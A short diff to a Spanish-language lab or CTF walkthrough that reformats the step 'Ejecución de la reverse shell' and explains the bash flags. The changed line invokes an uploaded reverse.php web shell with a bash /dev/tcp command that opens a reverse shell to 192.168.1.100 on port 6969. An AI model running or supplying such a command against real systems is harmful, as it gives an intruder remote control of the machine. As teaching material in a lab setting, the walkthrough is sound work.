@@ -155,7 +155,7 @@ Antes de ponerlo a prueba, es necesario subir el script a el servidor.
 
 ### **Ejecución de la reverse shell**
 
-http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"
+`http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`
 
 - `bash -c`: Ejecuta el siguiente comando en una nueva instancia de bash. Esto permite aislar la ejecución del comando del entorno actual.
 - `bash -i` :Ejecuta bash en modo interactivo. Esto crea una nueva sesión de shell interactiva, permitiendo al usuario ingresar comandos.
